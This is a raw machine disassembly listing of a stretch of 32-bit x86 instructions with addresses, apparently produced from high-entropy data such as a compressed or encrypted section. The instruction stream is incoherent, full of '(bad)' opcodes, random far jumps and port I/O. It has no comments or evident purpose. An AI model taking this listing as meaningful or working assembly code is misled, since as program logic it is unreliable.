  41b2f0:	call   0x93e0:0xdd399072
  41b2f7:	cmp    BYTE PTR [esi+eiz*8+0x60],ch
  41b2fb:	inc    edi
  41b2fc:	addr16 popa 
  41b2fe:	push   ebp
  41b2ff:	iret   
  41b300:	jecxz  0x41b36a
  41b302:	fwait
  41b303:	das    
  41b304:	mov    eax,0xb877d1e3
  41b309:	xchg   esp,eax
  41b30a:	stc    
  41b30b:	in     eax,0x9f
  41b30d:	pop    esp
  41b30e:	and    BYTE PTR [ebp-0x39],dl
  41b311:	pusha  
  41b312:	in     eax,0x4f
  41b314:	mov    dh,BYTE PTR [ebx+0x57bc6a05]
  41b31a:	sbb    BYTE PTR [ebx],dl
  41b31c:	jno    0x41b38d
  41b31e:	sub    eax,0xbc8cc021
  41b323:	xchg   edx,eax
  41b324:	mov    al,BYTE PTR [edi]
  41b326:	js     0x41b307
  41b328:	mov    al,0x7b
  41b32a:	push   0xffffffaa
  41b32c:	mov    edx,?
  41b32e:	jmp    0x7d7829d6
  41b333:	into   
  41b334:	lea    edx,[ebx-0x35]
  41b337:	lea    ebx,[edx-0x39]
  41b33a:	int3   
  41b33b:	and    ch,BYTE PTR [esi-0x28]
  41b33e:	(bad)  
  41b33f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b340:	loop   0x41b2fc
  41b342:	cmp    eax,0xabdb433f
  41b347:	test   BYTE PTR [edi+0x45],ch
  41b34a:	jmp    0xf2f7:0x916a8f93
  41b351:	mov    ds:0x97725a20,eax
  41b356:	jmp    0xf3a3a4ec
  41b35b:	scas   eax,DWORD PTR es:[edi]
  41b35c:	ins    DWORD PTR es:[edi],dx
  41b35d:	sub    ebp,DWORD PTR [esi-0x29]
  41b360:	xchg   edx,eax
  41b361:	mov    bl,0x51
  41b363:	xor    dl,BYTE PTR [edi+0x4fd0b6c9]
  41b369:	fisttp DWORD PTR [ecx+0x4d075127]
  41b36f:	call   FWORD PTR ds:[edi+0x6117bb73]
  41b376:	and    eax,0xa16279db
  41b37b:	into   
  41b37c:	fwait
  41b37d:	in     al,0xec
  41b37f:	imul   edx,DWORD PTR [ebx],0xfb82db0b
  41b385:	xchg   edi,eax
  41b386:	stc    
  41b387:	bswap  edi
  41b389:	imul   ebp,DWORD PTR [eax],0x937ef096
  41b38f:	dec    esi
  41b390:	das    
  41b391:	mov    al,0x9c
  41b393:	push   ecx
  41b394:	sbb    cl,BYTE PTR ds:0x87fad632
  41b39a:	mov    ah,0xa3
  41b39c:	stos   BYTE PTR es:[edi],al
  41b39d:	test   BYTE PTR [ebx],cl
  41b39f:	add    BYTE PTR [ecx+0xda60ded],dl
  41b3a5:	(bad)  
  41b3a6:	mov    dl,0x19
  41b3a8:	fild   WORD PTR [esi+eiz*1]
  41b3ab:	xchg   edi,eax
  41b3ac:	fcom   DWORD PTR [edi+ebp*2+0x5de526a]
  41b3b3:	adc    ebp,DWORD PTR [eax+0x40be22f1]
  41b3b9:	mov    esi,0x58d986c
  41b3be:	sahf   
  41b3bf:	ss aas 
  41b3c1:	mov    cs,WORD PTR [ecx-0x78]
  41b3c4:	popf   
  41b3c5:	cmp    esi,DWORD PTR [ebx]
  41b3c7:	scas   al,BYTE PTR es:[edi]
  41b3c8:	mov    edi,0x6fef7bd0
  41b3cd:	dec    eax
  41b3ce:	clc    
  41b3cf:	icebp  
  41b3d0:	sub    eax,0x5c59d26e
  41b3d5:	outs   dx,BYTE PTR ds:[esi]
  41b3d6:	popf   
  41b3d7:	sub    edi,DWORD PTR [ebx]
  41b3d9:	dec    edi
  41b3da:	push   edx
  41b3db:	xor    esp,DWORD PTR ds:0x5cdb51be
  41b3e1:	fldcw  WORD PTR [esi+edx*8+0x0]
  41b3e5:	cmp    bh,bl
  41b3e7:	xor    BYTE PTR [edi-0x67],ch
  41b3ea:	mov    ds:0x59b7,eax
	...
  41b453:	add    BYTE PTR [eax],al
  41b455:	add    BYTE PTR [eax+0xd],cl
  41b458:	sbb    eax,0xfebb5dab
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	fwait
  41b463:	cs (bad) 
  41b465:	aaa    
  41b466:	sbb    DWORD PTR ds:0xff0001,esp
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	cmp    DWORD PTR [esi-0x79],ecx
  41b471:	adc    al,0xae
  41b473:	adc    BYTE PTR [ebx],dh
  41b475:	push   cs
  41b476:	or     eax,DWORD PTR [edi+ebx*2]
  41b479:	cli    
  41b47a:	test   DWORD PTR [ebp+0x12d4a6ef],0x9b4b6ec4
  41b484:	scas   al,BYTE PTR es:[edi]
  41b485:	scas   al,BYTE PTR es:[edi]
  41b486:	das    
  41b487:	mov    BYTE PTR [ebp-0x16],al
  41b48a:	inc    ebx
  41b48b:	xchg   dl,bl
  41b48d:	mov    ebp,0x1ff57ce7
  41b492:	cmp    eax,0x8d10e12f
  41b497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b498:	stos   DWORD PTR es:[edi],eax
  41b499:	push   ebp
  41b49a:	inc    ebx
  41b49b:	test   ebx,0x39d7cc1f
  41b4a1:	int    0xd4
  41b4a3:	adc    esp,DWORD PTR [ecx]
  41b4a5:	out    dx,al
  41b4a6:	loope  0x41b4f0
  41b4a8:	xchg   ecx,eax
  41b4a9:	mov    esp,0x4d146601
  41b4ae:	cmc    
  41b4af:	lahf   
  41b4b0:	stos   BYTE PTR es:[edi],al
  41b4b1:	push   edx
  41b4b2:	outs   dx,BYTE PTR ds:[esi]
  41b4b3:	hlt    
  41b4b4:	xor    ch,ah
  41b4b6:	inc    esi
  41b4b7:	push   ebx
  41b4b8:	lea    edi,[eax]
  41b4ba:	pop    esi
  41b4bb:	ror    BYTE PTR ds:0xb1aa9cee,cl
  41b4c1:	nop
  41b4c2:	xchg   DWORD PTR [ecx],eax
  41b4c4:	adc    ebx,DWORD PTR [edi-0x63bfe045]
  41b4ca:	sahf   
  41b4cb:	call   0x476539b6
  41b4d0:	or     BYTE PTR [esi-0x7],cl
  41b4d3:	sar    BYTE PTR [ecx-0x6c8492db],1
  41b4d9:	fbld   TBYTE PTR [edx]
  41b4db:	xchg   ebx,eax
  41b4dc:	add    DWORD PTR [esi+0x24],esi
  41b4df:	aas    
  41b4e0:	push   esi
  41b4e1:	sub    BYTE PTR [edx],0x70
  41b4e4:	loope  0x41b4fe
  41b4e6:	jmp    DWORD PTR [ecx]
  41b4e8:	jbe    0x41b493
  41b4ea:	cmp    DWORD PTR [ecx+0x5409edd2],edi
  41b4f0:	mov    ds:0x642ecfe8,al
  41b4f5:	xchg   ecx,eax
  41b4f6:	xchg   esi,eax
  41b4f8:	inc    ebp
  41b4f9:	xchg   ebp,eax
  41b4fa:	xchg   ebx,eax
  41b4fb:	xchg   BYTE PTR [ecx+esi*8-0x3d041f75],bh
  41b502:	dec    ebp
  41b503:	xor    eax,0x596283b
  41b508:	test   DWORD PTR [ebp-0x75],esi
  41b50b:	cmp    DWORD PTR [ebp+0x29],esi
  41b50e:	sbb    eax,0xa84ceed0
  41b513:	popf   
  41b514:	or     al,BYTE PTR [eax-0x41d61299]
  41b51a:	stos   BYTE PTR es:[edi],al
  41b51b:	mov    ebp,0xcb200935
  41b520:	xchg   ebp,eax
  41b521:	rcl    DWORD PTR [ecx*2-0x78e72c01],1
  41b528:	data16 lock aas 
  41b52b:	jge    0x41b572
  41b52d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b52e:	aas    
  41b52f:	sbb    al,0xab
  41b531:	stos   BYTE PTR es:[edi],al
  41b532:	inc    ebx
  41b533:	mov    bh,0x9a
  41b535:	jnp    0x41b582
  41b537:	sub    ebx,DWORD PTR ds:0xe4e43806
  41b53d:	fimul  WORD PTR [ebx+0x2f]
  41b540:	fadd   QWORD PTR [edx+0x48]
  41b543:	inc    edx
  41b544:	into   
  41b545:	fwait
  41b546:	popf   
  41b547:	fadd   st(2),st
  41b549:	outs   dx,DWORD PTR ds:[esi]
  41b54a:	call   0xc3418fca
  41b54f:	or     ecx,DWORD PTR [ecx-0x10]
  41b552:	scas   eax,DWORD PTR es:[edi]
  41b553:	jg     0x41b57d
  41b555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b556:	mov    esi,0x868209f1
  41b55b:	ret    0x1328
  41b55e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b55f:	jae    0x41b5ba
  41b561:	arpl   WORD PTR [ecx+0x3a],cx
  41b564:	pusha  
  41b565:	xchg   ecx,eax
  41b566:	add    DWORD PTR [edx+0x61],edx
  41b569:	sbb    al,BYTE PTR [eax+0x9fc8]
	...
  41b5d3:	add    BYTE PTR [eax],al
  41b5d5:	add    ah,dl
  41b5d7:	in     al,dx
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	adc    ebx,ebp
  41b5e4:	pop    esp
  41b5e5:	push   ebp
  41b5e6:	sbb    BYTE PTR [esi],ah
  41b5e8:	add    DWORD PTR [eax],eax
  41b5ea:	inc    DWORD PTR [eax]
  41b5ec:	add    BYTE PTR [eax],al
  41b5ee:	push   0xfa3eaadd
  41b5f3:	fisubr WORD PTR [ecx]
  41b5f5:	rol    DWORD PTR [edx+0x31ea177c],0xad
  41b5fc:	or     DWORD PTR [edi-0x5963950f],esi
  41b602:	sar    DWORD PTR [edi],0x20
  41b605:	mul    DWORD PTR [edi]
  41b607:	jne    0x41b64d
  41b609:	cmp    DWORD PTR cs:[edx+ebx*1+0x1d],ecx
  41b60e:	mov    WORD PTR [ecx-0x73881b5c],ds
  41b614:	retf   
  41b615:	fiadd  DWORD PTR [edi+0x365a275e]
  41b61b:	dec    ecx
  41b61c:	(bad)  
  41b61d:	fisttp QWORD PTR [edi-0x1e]
  41b620:	into   
  41b621:	add    BYTE PTR [eax-0x50],ah
  41b624:	xor    BYTE PTR [esp+eiz*8+0x3f6f05f1],ah
  41b62b:	lahf   
  41b62c:	pop    ebp
  41b62d:	ret    0x2270
  41b630:	push   ds
  41b631:	stos   DWORD PTR es:[edi],eax
  41b632:	jmp    0x41b6a2
  41b634:	push   0x67d8045b
  41b639:	dec    edi
  41b63a:	cmp    DWORD PTR fs:[esi-0xa],ebp
  41b63e:	cmp    eax,0xf035118c
  41b643:	adc    BYTE PTR [esi+eiz*8-0x45],0x7a
  41b648:	cmp    al,0x70
  41b64a:	test   eax,0x5c4f5a35
  41b64f:	js     0x41b636
  41b651:	(bad)
  41b655:	xor    bl,BYTE PTR [edx+0x30]
  41b658:	hlt    
  41b659:	push   0x3c6971b8
  41b65e:	sbb    eax,0xe755d539
  41b663:	gs adc eax,0xd855a251
  41b669:	sbb    DWORD PTR [esi+0x496bbf0b],ebx
  41b66f:	mov    ebp,0x3428880d
  41b674:	ja     0x41b679
  41b676:	or     DWORD PTR [ebp-0x78],ebp
  41b679:	jle    0x41b61d
  41b67b:	hlt    
  41b67c:	mov    esp,0x28f472f4
  41b681:	push   esi
  41b682:	rol    BYTE PTR [ebx+0x5345944],cl
  41b688:	dec    esi
  41b689:	lods   eax,DWORD PTR ds:[esi]
  41b68a:	jb     0x41b699
  41b68c:	add    ch,BYTE PTR [esi+0xb]
  41b68f:	xchg   esi,eax
  41b690:	imul   ebp,eax,0xde24358d
  41b696:	and    esp,esp
  41b698:	xchg   ebp,eax
  41b699:	loop   0x41b61d
  41b69b:	push   cs
  41b69c:	and    DWORD PTR [edi+0x2dc10663],ebx
  41b6a2:	ja     0x41b70a
  41b6a4:	int3   
  41b6a5:	out    0x19,eax
  41b6a7:	ja     0x41b6da
  41b6a9:	scas   al,BYTE PTR es:[edi]
  41b6aa:	mov    ebx,0x7c26ac0d
  41b6af:	push   cs
  41b6b0:	daa    
  41b6b1:	sub    ebp,DWORD PTR [eax+0x4c90e16a]
  41b6b7:	scas   eax,DWORD PTR es:[edi]
  41b6b8:	xor    dh,ah
  41b6ba:	xlat   BYTE PTR ds:[ebx]
  41b6bb:	jae    0x41b6ba
  41b6bd:	loopne 0x41b68d
  41b6bf:	mov    gs,WORD PTR [edx+ecx*4]
  41b6c2:	adc    eax,0x93e81760
  41b6c7:	jns    0x41b69a
  41b6c9:	je     0x41b6ac
  41b6cb:	add    al,0x93
  41b6cd:	xchg   ecx,eax
  41b6ce:	std    
  41b6cf:	leave  
  41b6d0:	push   esp
  41b6d1:	test   ah,dl
  41b6d3:	call   esi
  41b6d5:	sahf   
  41b6d6:	pushf  
  41b6d7:	push   ds
  41b6d8:	sbb    al,BYTE PTR [ebx+0x52eeee0d]
  41b6de:	cld    
  41b6df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6e0:	retf   0xec01
  41b6e3:	xor    BYTE PTR [edx-0x36c59bf5],dh
  41b6e9:	sbb    edx,eax
  41b6eb:	mov    BYTE PTR [edi+0x0],bh
	...
  41b755:	add    BYTE PTR [eax-0x2469e49d],ch
  41b75b:	(bad)  
  41b75c:	lods   eax,DWORD PTR ds:[esi]
  41b75d:	jg     0x41b75a
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	stos   DWORD PTR es:[edi],eax
  41b763:	imul   esp,edx,0x1271779
  41b769:	add    bh,bh
  41b76b:	add    BYTE PTR [eax],al
  41b76d:	add    BYTE PTR [ebx+0x14],cl
  41b770:	out    dx,al
  41b771:	sub    cl,BYTE PTR [eax-0x43efdb2e]
  41b777:	test   DWORD PTR [ebx],ebp
  41b779:	mov    cs,esp
  41b77b:	jbe    0x41b722
  41b77d:	inc    edi
  41b77e:	inc    edi
  41b77f:	fwait
  41b780:	shl    DWORD PTR ds:0x580dab27,1
  41b786:	push   DWORD PTR [edx+ebp*4+0x332a7a25]
  41b78d:	jmp    0x94bb:0x92a9f77b
  41b794:	dec    eax
  41b795:	adc    ebx,ebx
  41b797:	xchg   edi,eax
  41b798:	dec    ebp
  41b799:	fisub  WORD PTR [ebx-0x43]
  41b79c:	in     al,0xa7
  41b79e:	lahf   
  41b79f:	cmp    BYTE PTR [ecx],ah
  41b7a1:	or     eax,0x444931d5
  41b7a6:	(bad)
  41b7aa:	push   esi
  41b7ab:	jmp    0x795d:0x859df09a
  41b7b2:	inc    edi
  41b7b3:	mov    dh,0x79
  41b7b5:	std    
  41b7b6:	scas   eax,DWORD PTR es:[edi]
  41b7b7:	les    esi,FWORD PTR [eax+0x6b]
  41b7ba:	cmc    
  41b7bb:	outs   dx,BYTE PTR ds:[esi]
  41b7bc:	fisttp DWORD PTR [edx-0x6b]
  41b7bf:	fwait
  41b7c0:	call   0x8c3f:0x357b6e61
  41b7c7:	lods   eax,DWORD PTR ds:[esi]
  41b7c8:	out    dx,eax
  41b7c9:	or     DWORD PTR [edi+0x38],edx
  41b7cc:	mov    cl,0x9c
  41b7ce:	pop    edi
  41b7cf:	outs   dx,BYTE PTR ds:[esi]
  41b7d0:	mov    esi,0x177bb99
  41b7d5:	adc    bl,ch
  41b7d7:	push   cs
  41b7d8:	es loop 0x41b78e
  41b7db:	es pop edx
  41b7dd:	and    DWORD PTR [edx-0x49e223f3],0x15
  41b7e4:	fs inc esi
  41b7e6:	sub    esp,DWORD PTR [esi]
  41b7e8:	lods   eax,DWORD PTR ds:[esi]
  41b7e9:	sub    bl,bl
  41b7eb:	loope  0x41b822
  41b7ed:	(bad)  
  41b7ee:	loope  0x41b7fd
  41b7f0:	xchg   ebp,eax
  41b7f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7f2:	inc    bh
  41b7f4:	adc    DWORD PTR [edi+0x7],0x6
  41b7f8:	push   ebx
  41b7f9:	ja     0x41b860
  41b7fb:	cmp    ch,al
  41b7fd:	inc    edx
  41b7fe:	pop    edi
  41b7ff:	and    eax,ebx
  41b801:	xor    eax,0xfb969f3b
  41b806:	rcr    DWORD PTR cs:[esi],cl
  41b809:	aam    0x32
  41b80b:	lods   eax,DWORD PTR ds:[esi]
  41b80c:	mov    edx,0xaee29463
  41b811:	mov    ebp,0xba2cdeee
  41b816:	mov    ah,0xec
  41b818:	pop    ds
  41b819:	leave  
  41b81a:	(bad)  
  41b81b:	adc    al,0x2f
  41b81d:	push   eax
  41b81e:	mov    esi,0x47b90445
  41b823:	stos   DWORD PTR es:[edi],eax
  41b824:	es (bad) 
  41b826:	lea    ebx,[edi-0x7a]
  41b829:	fucom  st(7)
  41b82b:	dec    esp
  41b82c:	push   ebx
  41b82d:	jnp    0x41b801
  41b82f:	test   BYTE PTR [si+0x8],bh
  41b833:	test   eax,0x6a90c2f4
  41b838:	call   DWORD PTR ds:0x96a4921f
  41b83e:	mov    ebp,0x940091ee
  41b844:	cdq    
  41b845:	pop    es
  41b846:	and    al,0x15
  41b848:	push   ss
  41b849:	mov    bl,0x5c
  41b84b:	sbb    ebp,ebp
  41b84d:	jns    0x41b7db
  41b84f:	std    
  41b850:	mov    eax,ds:0x9f651da7
  41b855:	leave  
  41b856:	loopne 0x41b822
  41b858:	loope  0x41b88c
  41b85a:	fadd   DWORD PTR [ecx-0x7ef876c5]
  41b860:	add    BYTE PTR [ebp+0x6a],bh
  41b863:	loopne 0x41b83f
  41b865:	sti    
  41b866:	mov    al,0x96
  41b868:	cmp    al,0x6d
  41b86a:	xlat   BYTE PTR ds:[ebx]
  41b86b:	jmp    0x41b85d
	...
  41b8d5:	add    BYTE PTR [edx-0x8b13804],cl
  41b8db:	jg     0x41b868
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0x4f
  41b8e3:	and    bl,BYTE PTR [esi+0x6a]
  41b8e6:	push   ss
  41b8e7:	sub    BYTE PTR [ecx],al
  41b8e9:	add    bh,bh
  41b8eb:	add    BYTE PTR [eax],al
  41b8ed:	add    bh,dl
  41b8ef:	pushf  
  41b8f0:	mov    cl,0x5f
  41b8f2:	ds dec edx
  41b8f4:	inc    edi
  41b8f5:	dec    ecx
  41b8f6:	les    eax,FWORD PTR [edx+0x76]
  41b8f9:	bound  ebx,QWORD PTR [edx+edx*2-0x6386d4d9]
  41b900:	cdq    
  41b901:	or     BYTE PTR [esi],ah
  41b903:	or     esi,esi
  41b905:	je     0x41b969
  41b907:	dec    ecx
  41b908:	push   cs
  41b909:	rcl    BYTE PTR [ebx-0x18],cl
  41b90c:	aaa    
  41b90d:	lods   al,BYTE PTR ds:[esi]
  41b90e:	out    dx,al
  41b90f:	aas    
  41b910:	push   ebp
  41b911:	retf   
  41b912:	inc    eax
  41b913:	mov    al,0xea
  41b915:	jl     0x41b905
  41b917:	nop
  41b918:	loop   0x41b91f
  41b91a:	in     eax,0x5b
  41b91c:	jne    0x41b909
  41b91e:	test   al,0x84
  41b920:	in     al,dx
  41b921:	call   0x96a2:0x32ff7de1
  41b928:	leave  
  41b929:	pop    ds
  41b92a:	jge    0x41b8cc
  41b92c:	xor    al,0xac
  41b92e:	rcr    DWORD PTR [ebp+ebp*2+0x46],1
  41b932:	mov    esi,DWORD PTR [edi+0x1d]
  41b935:	xor    eax,0x36a8f2c3
  41b93a:	pusha  
  41b93b:	jo     0x41b98d
  41b93d:	addr16 cmp al,dh
  41b940:	mov    ah,0xb6
  41b942:	or     ch,BYTE PTR [ebx+edi*4-0xbf82d42]
  41b949:	(bad)  
  41b94a:	inc    ebp
  41b94b:	mov    dh,0x1
  41b94d:	inc    edi
  41b94e:	dec    eax
  41b94f:	jp     0x41b91a
  41b951:	outs   dx,BYTE PTR ds:[esi]
  41b952:	mov    dh,0x1a
  41b954:	aas    
  41b955:	fistp  DWORD PTR [edi-0x4b]
  41b958:	lahf   
  41b959:	add    al,0x5a
  41b95b:	test   BYTE PTR ds:0x26d7b1f3,bl
  41b961:	mov    ah,0xff
  41b963:	mov    dh,0xae
  41b965:	ret    
  41b966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b967:	pop    edi
  41b968:	mov    ds:0x507c13ad,al
  41b96d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b96e:	push   edx
  41b96f:	rcr    DWORD PTR [edi+0x72ba82b9],1
  41b975:	pop    edx
  41b976:	xchg   ecx,eax
  41b977:	imul   DWORD PTR [edi-0x7278d078]
  41b97d:	jl     0x41b998
  41b97f:	aas    
  41b980:	fdiv   st,st(7)
  41b982:	mov    edx,edx
  41b984:	js     0x41b936
  41b986:	in     eax,0xf4
  41b988:	arpl   WORD PTR [edi+0x1b],si
  41b98b:	popa   
  41b98c:	jno    0x41b96a
  41b98e:	mov    bh,0x37
  41b990:	and    ecx,eax
  41b992:	mov    ds:0x821e1d3d,al
  41b997:	fdivr  QWORD PTR [esi+0x7f9074df]
  41b99d:	jge    0x41b99c
  41b99f:	neg    DWORD PTR [ecx-0x67]
  41b9a2:	lahf   
  41b9a3:	jmp    0x41b985
  41b9a5:	mov    ch,0xf7
  41b9a7:	nop
  41b9a8:	xor    eax,0x9c19e987
  41b9ad:	or     DWORD PTR [edi+0xb],ebx
  41b9b0:	les    edi,FWORD PTR [esi+0x50]
  41b9b3:	mov    ecx,0xaea40ad5
  41b9b8:	inc    ebp
  41b9b9:	imul   eax,edx,0x9ad1792
  41b9bf:	popa   
  41b9c0:	or     dl,ah
  41b9c2:	jle    0x41b99d
  41b9c4:	jmp    0x7ad102df
  41b9c9:	das    
  41b9ca:	mov    DWORD PTR [ebx],edi
  41b9cc:	in     al,dx
  41b9cd:	aaa    
  41b9ce:	mov    WORD PTR [eax-0x46],es
  41b9d1:	jae    0x41b977
  41b9d3:	push   esi
  41b9d4:	inc    ecx
  41b9d5:	push   edi
  41b9d6:	and    al,0xea
  41b9d8:	ror    DWORD PTR [ebp-0x18],1
  41b9db:	jno    0x41b9a8
  41b9dd:	jl     0x41b997
  41b9df:	push   cs
  41b9e0:	inc    edx
  41b9e1:	ds loope 0x41b9bb
  41b9e4:	sbb    al,BYTE PTR [ecx+0x25]
  41b9e7:	fwait
  41b9e8:	je     0x41ba1b
  41b9ea:	jns    0x41ba1f
  41b9ec:	rol    BYTE PTR [eax],cl
	...
  41ba56:	ret    
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	(bad)  
  41ba63:	sub    dh,ah
  41ba65:	push   0x12915
  41ba6a:	inc    DWORD PTR [eax]
  41ba6c:	add    BYTE PTR [eax],al
  41ba6e:	js     0x41ba57
  41ba70:	pop    ss
  41ba71:	daa    
  41ba72:	out    dx,al
  41ba73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba74:	xor    eax,0xbfcaa881
  41ba79:	push   esi
  41ba7a:	push   ebp
  41ba7b:	xchg   BYTE PTR [edx-0x762980ad],cl
  41ba81:	dec    esp
  41ba82:	xor    al,dl
  41ba84:	jmp    0x7ba8:0xe677dade
  41ba8b:	adc    DWORD PTR [eax-0x1d674ab2],ecx
  41ba91:	out    dx,eax
  41ba92:	rcl    DWORD PTR [ecx-0x45],0x8e
  41ba96:	jmp    0xd823:0x85465559
  41ba9d:	push   edx
  41ba9e:	and    al,BYTE PTR [ecx+esi*1]
  41baa1:	add    dl,bh
  41baa3:	pusha  
  41baa4:	repnz lds edi,FWORD PTR [esi]
  41baa7:	mov    eax,ds:0x7208fac5
  41baac:	fwait
  41baad:	les    edx,FWORD PTR [edi]
  41baaf:	pop    esp
  41bab0:	cmp    DWORD PTR [edi-0x1c],esp
  41bab3:	xchg   edi,eax
  41bab4:	out    dx,eax
  41bab5:	or     dh,bl
  41bab7:	ins    BYTE PTR es:[edi],dx
  41bab8:	fdiv   QWORD PTR [ebx]
  41baba:	hlt    
  41babb:	(bad)  
  41babc:	or     eax,0xf79c1567
  41bac1:	repz scas eax,DWORD PTR es:[edi]
  41bac3:	(bad)
  41bac6:	sub    DWORD PTR [ebp+ebp*4+0x5e],ebx
  41baca:	sbb    esp,ecx
  41bacc:	pop    ss
  41bacd:	lahf   
  41bace:	ret    0x2e44
  41bad1:	jnp    0x41bb3b
  41bad3:	inc    ecx
  41bad4:	fcmovnb st,st(3)
  41bad6:	sub    DWORD PTR [esi+ebp*1],eax
  41bad9:	and    al,0x2
  41badb:	pop    edi
  41badc:	mov    al,0x29
  41bade:	push   edi
  41badf:	aad    0x2f
  41bae1:	lea    ebp,[ebx-0x20d661db]
  41bae7:	and    eax,0x78fa99bb
  41baec:	stos   BYTE PTR es:[edi],al
  41baed:	stc    
  41baee:	scas   al,BYTE PTR es:[edi]
  41baef:	sub    eax,0x657a872e
  41baf4:	(bad)  
  41baf5:	fnstenv [eax-0x1d18a34c]
  41bafb:	popa   
  41bafc:	cs push 0xc747ea37
  41bb02:	adc    eax,0x1f00a442
  41bb07:	js     0x41bb52
  41bb09:	xchg   ebp,eax
  41bb0a:	jne    0x41bb06
  41bb0c:	repz (bad) 
  41bb0e:	(bad)  
  41bb0f:	mov    ch,0xc6
  41bb11:	lds    ebp,FWORD PTR [ebx]
  41bb13:	adc    bl,dl
  41bb15:	mov    ah,0xbf
  41bb17:	mov    dh,0x8f
  41bb19:	inc    esi
  41bb1a:	dec    edx
  41bb1b:	xchg   BYTE PTR [ebp-0x22],ah
  41bb1e:	lahf   
  41bb1f:	(bad)  
  41bb20:	mov    dl,0xe7
  41bb22:	fdivrp st(7),st
  41bb24:	stc    
  41bb25:	sub    BYTE PTR [ebx-0x6],dl
  41bb28:	xchg   ebx,eax
  41bb29:	jae    0x41bb8e
  41bb2b:	add    esi,ebx
  41bb2d:	jp     0x41bb70
  41bb2f:	mov    edx,esp
  41bb31:	(bad)  
  41bb32:	pop    esi
  41bb33:	mov    ebp,0xbd280227
  41bb38:	sar    DWORD PTR [esi+0x1e6c3742],1
  41bb3e:	fwait
  41bb3f:	mov    al,ds:0xb27f5e63
  41bb44:	out    dx,al
  41bb45:	aam    0x48
  41bb47:	enter  0x5322,0xcf
  41bb4b:	ficom  WORD PTR [edx-0x7b]
  41bb4e:	xchg   ecx,eax
  41bb4f:	(bad)  
  41bb51:	add    bl,BYTE PTR [ebx+edi*1+0x159778d7]
  41bb58:	aas    
  41bb59:	and    eax,0x450e67c8
  41bb5e:	mov    eax,ds:0xe455dd8a
  41bb63:	aaa    
  41bb64:	out    0x98,eax
  41bb66:	jmp    0xdb1ea357
  41bb6b:	retf   
  41bb6c:	int    0x0
	...
  41bbd6:	or     bh,BYTE PTR [eax-0x4048555b]
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi+0x5],cx
  41bbe3:	outs   dx,BYTE PTR cs:[esi]
  41bbe5:	adc    edx,DWORD PTR [edx+ebp*1]
  41bbe8:	add    DWORD PTR [eax],eax
  41bbea:	inc    DWORD PTR [eax]
  41bbec:	add    BYTE PTR [eax],al
  41bbee:	js     0x41bbf7
  41bbf0:	xor    BYTE PTR [esi-0x67b93827],cl
  41bbf6:	pop    es
  41bbf7:	sbb    eax,0xe45cdf09
  41bbfc:	les    esp,FWORD PTR [edx]
  41bbfe:	mov    bh,0xc3
  41bc00:	(bad)  
  41bc02:	mov    eax,ds:0x13ee473
  41bc07:	mov    ?,ebp
  41bc09:	mov    DWORD PTR [edi],esi
  41bc0b:	dec    esi
  41bc0c:	cmp    ebx,esp
  41bc0e:	dec    edi
  41bc0f:	push   esi
  41bc10:	scas   al,BYTE PTR es:[edi]
  41bc11:	and    dl,BYTE PTR [eax+ebp*8-0x60]
  41bc15:	(bad)  
  41bc16:	and    esi,DWORD PTR [eax]
  41bc18:	mov    ebp,0xb1e12958
  41bc1d:	cs xchg ebp,esp
  41bc20:	aam    0x8c
  41bc22:	xchg   ebp,eax
  41bc23:	imul   ebx,DWORD PTR [esi],0xa8369efb
  41bc29:	sub    al,0xd7
  41bc2b:	lds    eax,FWORD PTR [ebx+0x76]
  41bc2e:	in     eax,dx
  41bc2f:	jle    0x41bbf6
  41bc31:	xchg   ch,dh
  41bc33:	test   eax,0x79ec6e79
  41bc38:	inc    eax
  41bc39:	pushfw 
  41bc3b:	sbb    al,0x9c
  41bc3d:	mov    eax,edx
  41bc3f:	cmp    bl,0x7e
  41bc42:	inc    ebp
  41bc43:	cmc    
  41bc44:	push   ecx
  41bc45:	xchg   DWORD PTR [ecx],esi
  41bc47:	xchg   ebp,eax
  41bc48:	dec    edx
  41bc49:	loope  0x41bc4f
  41bc4b:	call   0x688b:0x3f6fd335
  41bc52:	cmp    eax,0xedb5bebf
  41bc57:	cmc    
  41bc58:	addr16 jae 0x41bc7f
  41bc5b:	fwait
  41bc5c:	out    dx,eax
  41bc5d:	adc    ebp,DWORD PTR [ecx-0xd5148d3]
  41bc63:	pop    esi
  41bc64:	or     DWORD PTR [ecx],edi
  41bc66:	cmp    BYTE PTR [ebx+0x162dde89],ah
  41bc6c:	sbb    dh,BYTE PTR [ebx+0x43dc91ab]
  41bc72:	mov    cl,0x56
  41bc74:	(bad)  
  41bc75:	mov    WORD PTR [edi+ebx*2-0x6edb57d0],fs
  41bc7c:	outs   dx,BYTE PTR ds:[esi]
  41bc7d:	cmc    
  41bc7e:	das    
  41bc7f:	bound  esp,QWORD PTR [di+0x3554]
  41bc84:	or     eax,0x37aac46f
  41bc89:	ror    BYTE PTR [edi-0x47],0xa0
  41bc8d:	test   BYTE PTR [eax+0x79],ah
  41bc90:	ss data16 mov bh,0x78
  41bc94:	pop    esp
  41bc95:	(bad)  
  41bc97:	jl     0x41bcf2
  41bc99:	push   0x3c
  41bc9b:	or     BYTE PTR [edi+0x27],dh
  41bc9e:	lods   eax,DWORD PTR ds:[esi]
  41bc9f:	xchg   edx,eax
  41bca0:	inc    eax
  41bca1:	cwde   
